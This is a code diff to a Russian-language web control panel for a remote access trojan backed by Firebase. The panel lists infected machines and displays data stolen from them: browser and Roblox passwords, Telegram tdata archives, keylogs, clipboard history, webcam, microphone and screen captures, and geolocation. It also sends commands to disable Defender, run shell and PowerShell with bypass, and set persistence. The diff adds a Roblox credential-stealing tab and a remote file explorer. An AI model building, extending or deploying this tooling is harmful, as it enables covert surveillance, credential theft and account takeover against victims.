@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Remote Admin Panel v4 - Монстр</title>
+    <title>Remote Admin Panel v4.1 - Проводник</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
     <style>
@@ -26,6 +26,15 @@
         .nav-tabs .nav-link.active { background: #333; color: #fff; border-color: #555; }
         .card { background: #1e1e1e; border-color: #333; }
         .card-header { background: #2a2a2a; color: #ddd; }
+        .file-item { padding: 4px 8px; cursor: pointer; border-radius: 4px; }
+        .file-item:hover { background: #333; }
+        .file-item .bi-folder { color: #ffc107; }
+        .file-item .bi-file-earmark { color: #6c757d; }
+        .file-item .bi-file-earmark-zip { color: #fd7e14; }
+        .file-item .bi-file-earmark-image { color: #0d6efd; }
+        .file-item .bi-file-earmark-music { color: #20c997; }
+        .file-item .bi-file-earmark-play { color: #dc3545; }
+        .path-bar { background: #222; padding: 8px; border-radius: 6px; font-size: 0.9rem; }
     </style>
 </head>
 <body>
@@ -66,11 +75,12 @@ const db = getDatabase(app);
 
 // Состояние
 let currentClient = null;
-let subscriptions = {}; // для хранения функций отписки
+let subscriptions = {};
 let clientsData = {};
 let clientElements = {};
+let currentPath = ""; // для файлового менеджера
 
-// ========== Работа со списком клиентов ==========
+// ========== Список клиентов ==========
 onValue(ref(db, 'clients'), (snap) => {
     const data = snap.val();
     const list = document.getElementById('clientList');
@@ -102,7 +112,6 @@ function updateStatus(id) {
 }
 setInterval(() => Object.keys(clientsData).forEach(updateStatus), 2000);
 
-// Статус соединения с Firebase
 onValue(ref(db, '.info/connected'), (snap) => {
     const el = document.getElementById('connectionStatus');
     if (snap.val()) {
@@ -122,28 +131,21 @@ function selectClient(id) {
     currentClient = id;
     if (clientElements[id]) clientElements[id].classList.add('active');
     
-    // Отписываемся от старых подписок
     Object.values(subscriptions).forEach(unsub => { if (unsub) unsub(); });
     subscriptions = {};
     
     renderPanel(id);
     
-    // Подписка на все нужные поля
     const clientRef = ref(db, `clients/${id}`);
     
-    // Скриншот
     subscriptions.screenshot = onValue(ref(db, `clients/${id}/screenshot`), (snap) => {
         const img = document.getElementById('screenshotImg');
         if (img) img.src = snap.val() ? `data:image/jpeg;base64,${snap.val()}` : '';
     });
-    
-    // Вывод команд
     subscriptions.cmdOutput = onValue(ref(db, `clients/${id}/last_cmd_output`), (snap) => {
         const val = snap.val();
         if (val) addLog(`CMD Output:\n${val}`);
     });
-    
-    // Архив tdata
     subscriptions.tdata = onValue(ref(db, `clients/${id}/tdata_archive`), (snap) => {
         const archive = snap.val();
         const area = document.getElementById('tdataArchiveArea');
@@ -158,16 +160,14 @@ function selectClient(id) {
                 <div>
                     <i class="bi bi-file-zip"></i> <strong>${escapeHtml(archive.name)}</strong>
                     <span class="text-muted ms-2">(${sizeMB} МБ)</span>
-                    <br><small class="text-danger">⚠️ Одноразовая ссылка: после скачивания файл удалится с сервера (file.io)</small>
+                    <br><small class="text-danger">⚠️ Одноразовая ссылка</small>
                 </div>
                 <a href="${archive.download_url}" target="_blank" class="btn btn-sm btn-primary">
-                    <i class="bi bi-download"></i> Скачать (один раз)
+                    <i class="bi bi-download"></i> Скачать
                 </a>
             </div>
         `;
     });
-    
-    // Геолокация
     subscriptions.geo = onValue(ref(db, `clients/${id}/geo`), (snap) => {
         const geo = snap.val();
         const el = document.getElementById('geoInfo');
@@ -181,8 +181,6 @@ function selectClient(id) {
             el.innerHTML = '<span class="text-secondary">Нет данных</span>';
         }
     });
-    
-    // Пароли
     subscriptions.passwords = onValue(ref(db, `clients/${id}/passwords`), (snap) => {
         const val = snap.val();
         const el = document.getElementById('passwordsDisplay');
@@ -203,16 +201,33 @@ function selectClient(id) {
             el.innerHTML = '<span class="text-secondary">Нет паролей</span>';
         }
     });
-    
-    // Кейлог
+    // Roblox пароли
+    subscriptions.roblox = onValue(ref(db, `clients/${id}/roblox_passwords`), (snap) => {
+        const val = snap.val();
+        const el = document.getElementById('robloxDisplay');
+        if (!el) return;
+        if (val && val !== "[]") {
+            try {
+                const data = typeof val === 'string' ? JSON.parse(val) : val;
+                let html = '<div class="table-responsive"><table class="table table-dark table-sm"><thead><tr><th>URL</th><th>Логин</th><th>Пароль</th></tr></thead><tbody>';
+                data.forEach(item => {
+                    html += `<tr><td>${escapeHtml(item.url || '')}</td><td>${escapeHtml(item.username || '')}</td><td>${escapeHtml(item.password || '')}</td></tr>`;
+                });
+                html += '</tbody></table></div>';
+                el.innerHTML = html;
+            } catch(e) {
+                el.innerHTML = `<pre>${escapeHtml(val)}</pre>`;
+            }
+        } else {
+            el.innerHTML = '<span class="text-secondary">Паролей Roblox не найдено</span>';
+        }
+    });
     subscriptions.keylog = onValue(ref(db, `clients/${id}/keylog`), (snap) => {
         const val = snap.val();
         const el = document.getElementById('keylogDisplay');
         if (!el) return;
         el.innerHTML = val ? `<pre>${escapeHtml(val)}</pre>` : '<span class="text-secondary">Нет данных</span>';
     });
-    
-    // Буфер обмена (последние 20 записей)
     subscriptions.clipboard = onValue(ref(db, `clients/${id}/clipboard_history`), (snap) => {
         const data = snap.val();
         const el = document.getElementById('clipboardDisplay');
@@ -230,16 +245,15 @@ function selectClient(id) {
             el.innerHTML = '<span class="text-secondary">Нет данных</span>';
         }
     });
-    
-    // Список файлов
+    // Файловый список (проводник)
     subscriptions.fileList = onValue(ref(db, `clients/${id}/file_list`), (snap) => {
         const val = snap.val();
         const el = document.getElementById('fileListDisplay');
         if (!el) return;
         if (val && Array.isArray(val)) {
-            el.innerHTML = `<ul class="list-unstyled small">${val.map(f => `<li>${escapeHtml(f)}</li>`).join('')}</ul>`;
+            renderFileList(val);
         } else {
-            el.innerHTML = '<span class="text-secondary">Нет списка</span>';
+            el.innerHTML = '<span class="text-secondary">Нет файлов</span>';
         }
     });
     // Ошибки файлового менеджера
@@ -254,8 +268,6 @@ function selectClient(id) {
             addLog(`Файл скачан: ${name} -> ${url}`);
         }
     });
-    
-    // Микрофон
     subscriptions.mic = onValue(ref(db, `clients/${id}/mic_url`), (snap) => {
         const url = snap.val();
         const el = document.getElementById('micLink');
@@ -266,7 +278,6 @@ function selectClient(id) {
             el.innerHTML = '<span class="text-secondary">Нет записи</span>';
         }
     });
-    // Веб-камера
     subscriptions.webcam = onValue(ref(db, `clients/${id}/webcam_image`), (snap) => {
         const b64 = snap.val();
         const el = document.getElementById('webcamImg');
@@ -278,7 +289,6 @@ function selectClient(id) {
             el.style.display = 'none';
         }
     });
-    // Статус Defender
     subscriptions.defender = onValue(ref(db, `clients/${id}/defender_status`), (snap) => {
         const status = snap.val();
         const el = document.getElementById('defenderStatus');
@@ -289,7 +299,6 @@ function selectClient(id) {
             el.innerHTML = '<span class="text-secondary">Неизвестно</span>';
         }
     });
-    // PowerShell вывод
     subscriptions.psOutput = onValue(ref(db, `clients/${id}/ps_output`), (snap) => {
         const out = snap.val();
         const el = document.getElementById('psOutput');
@@ -300,7 +309,6 @@ function selectClient(id) {
             el.innerHTML = '<span class="text-secondary">Нет вывода</span>';
         }
     });
-    // Ошибки PowerShell
     subscriptions.psError = onValue(ref(db, `clients/${id}/ps_error`), (snap) => {
         const err = snap.val();
         if (err) addLog(`[PS ERROR] ${err}`);
@@ -324,7 +332,75 @@ function escapeHtml(str) {
     });
 }
 
-// ========== Пресеты (localStorage) ==========
+// ========== Проводник ==========
+function renderFileList(items) {
+    const el = document.getElementById('fileListDisplay');
+    const container = document.getElementById('fileListContainer');
+    if (!el) return;
+    let html = '';
+    // Навигация: показываем текущий путь
+    const pathEl = document.getElementById('currentPathDisplay');
+    if (pathEl) pathEl.textContent = currentPath || 'Корень';
+    // Поиск
+    const searchVal = document.getElementById('fileSearch')?.value.toLowerCase() || '';
+    const filtered = items.filter(item => item.name.toLowerCase().includes(searchVal));
+    if (filtered.length === 0) {
+        html = '<div class="text-secondary">Пусто</div>';
+    } else {
+        html = '<div class="list-group list-group-flush">';
+        filtered.forEach(item => {
+            const icon = item.is_dir ? '<i class="bi bi-folder"></i>' : getFileIcon(item.name);
+            const size = item.is_dir ? '' : (item.size / 1024).toFixed(1) + ' KB';
+            const mtime = item.mtime ? new Date(item.mtime).toLocaleString() : '';
+            const click = item.is_dir ? `onclick="navigateTo('${escapeHtml(item.name)}')"` : '';
+            html += `<div class="file-item list-group-item list-group-item-action bg-dark text-light" ${click}>
+                <span>${icon} ${escapeHtml(item.name)}</span>
+                <span class="float-end text-muted small">${size} ${mtime}</span>
+            </div>`;
+        });
+        html += '</div>';
+    }
+    el.innerHTML = html;
+}
+
+function getFileIcon(name) {
+    const ext = name.split('.').pop().toLowerCase();
+    if (['jpg','jpeg','png','gif','bmp','svg'].includes(ext)) return '<i class="bi bi-file-earmark-image"></i>';
+    if (['zip','rar','7z','gz'].includes(ext)) return '<i class="bi bi-file-earmark-zip"></i>';
+    if (['mp3','wav','flac','aac'].includes(ext)) return '<i class="bi bi-file-earmark-music"></i>';
+    if (['mp4','avi','mkv','mov'].includes(ext)) return '<i class="bi bi-file-earmark-play"></i>';
+    if (['exe','msi'].includes(ext)) return '<i class="bi bi-file-earmark-binary"></i>';
+    return '<i class="bi bi-file-earmark"></i>';
+}
+
+window.navigateTo = function(name) {
+    if (!currentClient) return;
+    let newPath = currentPath ? currentPath + '\\' + name : name;
+    // Если это переход вверх
+    if (name === '..') {
+        const parts = currentPath.split('\\');
+        parts.pop();
+        newPath = parts.join('\\');
+    }
+    currentPath = newPath;
+    const payload = JSON.stringify({action: 'list', path: currentPath});
+    sendCmd('file_manager', payload);
+};
+
+window.goBack = function() {
+    if (!currentPath) return;
+    const parts = currentPath.split('\\');
+    if (parts.length > 1) {
+        parts.pop();
+        currentPath = parts.join('\\');
+    } else {
+        currentPath = '';
+    }
+    const payload = JSON.stringify({action: 'list', path: currentPath});
+    sendCmd('file_manager', payload);
+};
+
+// ========== Пресеты ==========
 const PRESETS_KEY = 'remoteControlPresets';
 function loadPresets() {
     try {
@@ -371,16 +447,16 @@ function renderPanel(id) {
     main.innerHTML = `
         <h3><i class="bi bi-sliders"></i> Управление: <span class="text-info">${escapeHtml(id)}</span></h3>
         
-        <!-- Вкладки -->
         <ul class="nav nav-tabs" id="mainTabs" role="tablist">
             <li class="nav-item"><a class="nav-link active" id="tab-general" data-bs-toggle="tab" href="#general">Основное</a></li>
             <li class="nav-item"><a class="nav-link" id="tab-files" data-bs-toggle="tab" href="#files">Файлы</a></li>
             <li class="nav-item"><a class="nav-link" id="tab-extras" data-bs-toggle="tab" href="#extras">Дополнительно</a></li>
+            <li class="nav-item"><a class="nav-link" id="tab-roblox" data-bs-toggle="tab" href="#roblox">Roblox</a></li>
             <li class="nav-item"><a class="nav-link" id="tab-persistence" data-bs-toggle="tab" href="#persistence">Persistence</a></li>
         </ul>
         
         <div class="tab-content">
-            <!-- Вкладка Общее -->
+            <!-- Основное -->
             <div class="tab-pane fade show active" id="general" role="tabpanel">
                 <div class="row mt-3">
                     <div class="col-md-8">
@@ -421,7 +497,6 @@ function renderPanel(id) {
                     </div>
                 </div>
                 
-                <!-- Быстрые команды -->
                 <div class="mt-3">
                     <h5>Быстрые команды</h5>
                     <div class="d-flex flex-wrap gap-2">
@@ -457,30 +532,29 @@ function renderPanel(id) {
                 </div>
             </div>
             
-            <!-- Вкладка Файлы -->
+            <!-- Файлы (проводник) -->
             <div class="tab-pane fade" id="files" role="tabpanel">
                 <div class="row mt-3">
-                    <div class="col-md-6">
+                    <div class="col-md-12">
                         <div class="card bg-dark border-secondary">
-                            <div class="card-header"><i class="bi bi-folder"></i> Файловый менеджер</div>
+                            <div class="card-header"><i class="bi bi-folder2-open"></i> Проводник</div>
                             <div class="card-body">
-                                <div class="input-group mb-2">
-                                    <input type="text" id="filePath" class="form-control" placeholder="Путь к файлу/папке">
-                                    <button class="btn btn-outline-primary" onclick="sendFileManager('list')"><i class="bi bi-list"></i> Список</button>
-                                    <button class="btn btn-outline-success" onclick="sendFileManager('download')"><i class="bi bi-download"></i> Скачать</button>
-                                    <button class="btn btn-outline-danger" onclick="sendFileManager('delete')"><i class="bi bi-trash"></i> Удалить</button>
+                                <div class="row g-2 mb-2">
+                                    <div class="col-md-6">
+                                        <div class="path-bar">
+                                            <i class="bi bi-folder"></i> <span id="currentPathDisplay">Корень</span>
+                                        </div>
+                                    </div>
+                                    <div class="col-md-6">
+                                        <div class="input-group">
+                                            <input type="text" id="fileSearch" class="form-control form-control-sm" placeholder="Поиск..." oninput="filterFiles()">
+                                            <button class="btn btn-outline-secondary btn-sm" onclick="goBack()"><i class="bi bi-arrow-up"></i> Назад</button>
+                                            <button class="btn btn-outline-primary btn-sm" onclick="refreshFileList()"><i class="bi bi-arrow-repeat"></i></button>
+                                        </div>
+                                    </div>
                                 </div>
                                 <div id="fileListDisplay" class="data-block"><span class="text-secondary">Нет данных</span></div>
                                 <div id="downloadedFileName" style="display:none;"></div>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-6">
-                        <div class="card bg-dark border-secondary">
-                            <div class="card-header"><i class="bi bi-key"></i> Пароли из браузеров</div>
-                            <div class="card-body">
-                                <button class="btn btn-outline-warning mb-2" onclick="sendCmd('extract_passwords')"><i class="bi bi-arrow-repeat"></i> Извлечь пароли</button>
-                                <div id="passwordsDisplay" class="data-block"><span class="text-secondary">Нет данных</span></div>
                             </div>
                         </div>
                     </div>
@@ -513,7 +587,7 @@ function renderPanel(id) {
                 <div class="row mt-3">
                     <div class="col-md-12">
                         <div class="card bg-dark border-secondary">
-                            <div class="card-header"><i class="bi bi-terminal"></i> PowerShell (с Bypass)</div>
+                            <div class="card-header"><i class="bi bi-terminal"></i> PowerShell (Bypass)</div>
                             <div class="card-body">
                                 <div class="input-group mb-2">
                                     <textarea id="psScript" class="form-control" rows="3" placeholder="Введите PowerShell-скрипт..."></textarea>
@@ -527,7 +601,7 @@ function renderPanel(id) {
                 </div>
             </div>
             
-            <!-- Вкладка Дополнительно -->
+            <!-- Дополнительно -->
             <div class="tab-pane fade" id="extras" role="tabpanel">
                 <div class="row mt-3">
                     <div class="col-md-6">
@@ -550,7 +624,7 @@ function renderPanel(id) {
                 <div class="row mt-3">
                     <div class="col-md-12">
                         <div class="card bg-dark border-secondary">
-                            <div class="card-header"><i class="bi bi-shield-shaded"></i> Защита и обход</div>
+                            <div class="card-header"><i class="bi bi-shield-shaded"></i> Защита</div>
                             <div class="card-body">
                                 <button class="btn btn-outline-warning" onclick="sendCmd('disable_defender')"><i class="bi bi-shield-slash"></i> Отключить Defender</button>
                                 <span class="ms-2">Статус: <span id="defenderStatus2">—</span></span>
@@ -560,7 +634,22 @@ function renderPanel(id) {
                 </div>
             </div>
             
-            <!-- Вкладка Persistence -->
+            <!-- Roblox -->
+            <div class="tab-pane fade" id="roblox" role="tabpanel">
+                <div class="row mt-3">
+                    <div class="col-md-12">
+                        <div class="card bg-dark border-secondary">
+                            <div class="card-header"><i class="bi bi-controller"></i> Пароли Roblox</div>
+                            <div class="card-body">
+                                <button class="btn btn-outline-primary mb-2" onclick="sendCmd('extract_passwords')"><i class="bi bi-arrow-repeat"></i> Извлечь все пароли</button>
+                                <div id="robloxDisplay" class="data-block"><span class="text-secondary">Нет данных</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Persistence -->
             <div class="tab-pane fade" id="persistence" role="tabpanel">
                 <div class="row mt-3">
                     <div class="col-md-12">
@@ -585,7 +674,6 @@ function renderPanel(id) {
         </div>
     `;
 
-    // Обработчики изменений в пресетах
     document.querySelectorAll('.preset-name, .preset-cmd, .preset-payload').forEach(el => {
         el.addEventListener('input', () => updatePreset(el.dataset.index));
     });
@@ -630,55 +718,56 @@ window.sendMsg = function() {
     if (!text) return;
     sendCmd('msg', text);
 };
-
 window.sendTTS = function() {
     const text = document.getElementById('ttsText')?.value.trim();
     if (!text) return alert('Введите текст');
     sendCmd('tts', text);
 };
-
 window.sendWallpaper = function() {
     const url = document.getElementById('wallpaperUrl')?.value.trim();
     if (!url) return alert('Введите URL');
     sendCmd('wallpaper', url);
 };
-
 window.sendBlockInput = function(enable) {
     sendCmd('block_input', enable ? 'true' : 'false');
 };
-
 window.sendDisco = function() {
     sendCmd('disco', '10');
 };
-
 window.sendCmdExec = function() {
     const cmdText = document.getElementById('cmdExec')?.value.trim();
     if (!cmdText) return alert('Введите команду');
     sendCmd('cmd_execute', cmdText);
 };
-
-// Новые функции отправки
-window.sendFileManager = function(action) {
-    const path = document.getElementById('filePath')?.value.trim();
-    if (!path) return alert('Введите путь');
-    const payload = JSON.stringify({action, path});
-    sendCmd('file_manager', payload);
-};
-
 window.sendMic = function() {
     const dur = document.getElementById('micDuration')?.value || '10';
     sendCmd('record_mic', dur);
 };
-
 window.sendPS = function() {
     const script = document.getElementById('psScript')?.value.trim();
     if (!script) return alert('Введите PowerShell-скрипт');
     sendCmd('powershell_execute', script);
 };
+window.refreshFileList = function() {
+    if (!currentPath) currentPath = 'C:\\';
+    const payload = JSON.stringify({action: 'list', path: currentPath});
+    sendCmd('file_manager', payload);
+};
+window.filterFiles = function() {
+    // Перерисовываем уже полученный список с учётом поиска
+    const items = document.getElementById('fileListDisplay')?.__cachedItems;
+    if (items) renderFileList(items);
+};
+// Перехватываем обновление file_list, чтобы кэшировать
+const origRender = renderFileList;
+renderFileList = function(items) {
+    const el = document.getElementById('fileListDisplay');
+    if (el) el.__cachedItems = items;
+    origRender(items);
+};
 
-// Поддержка Bootstrap tabs (если не инициализированы)
+// Инициализация табов
 document.addEventListener('DOMContentLoaded', function() {
-    // Инициализация табов (Bootstrap 5)
     const triggerTabList = [].slice.call(document.querySelectorAll('#mainTabs a'));
     triggerTabList.forEach(function(triggerEl) {
         const tabTrigger = new bootstrap.Tab(triggerEl);
@@ -689,7 +778,6 @@ document.addEventListener('DOMContentLoaded', function() {
     });
 });
 </script>
-<!-- Подключаем Bootstrap JS для табов -->
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
